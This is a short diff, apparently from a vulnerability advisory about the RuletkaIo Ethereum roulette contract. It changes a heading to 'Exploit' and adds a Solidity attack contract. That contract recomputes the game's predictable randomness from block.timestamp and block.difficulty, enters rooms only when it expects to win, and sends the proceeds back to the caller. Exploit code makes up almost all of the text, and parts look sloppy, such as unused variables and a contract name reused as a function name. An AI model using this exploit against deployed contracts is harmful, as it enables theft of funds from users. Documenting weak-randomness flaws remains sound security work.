@@ -36,5 +36,22 @@ Related code
         winningAddress.transfer(prize);
     }
 
-Details
+Exploit
 ------
+    contract attack{
+    
+        function attack(address _target, uint256 roomId, uint256 s_idx, uint256 amount) public payable{
+        
+            address[] players;
+            uint256 entryPrice;
+        
+            RuletkaIo target = RuletkaIo(_target);
+            uint256 rand = uint256(uint256(keccak256(block.timestamp, block.difficulty)))%6;
+            if(rand < s_idx){
+                for(uint256 i = s_idx; i<6; i++){
+                    target.enter.value(amount)(roomId);
+                }
+            }
+            msg.sender.transfer(this.balance);
+        }
+    }
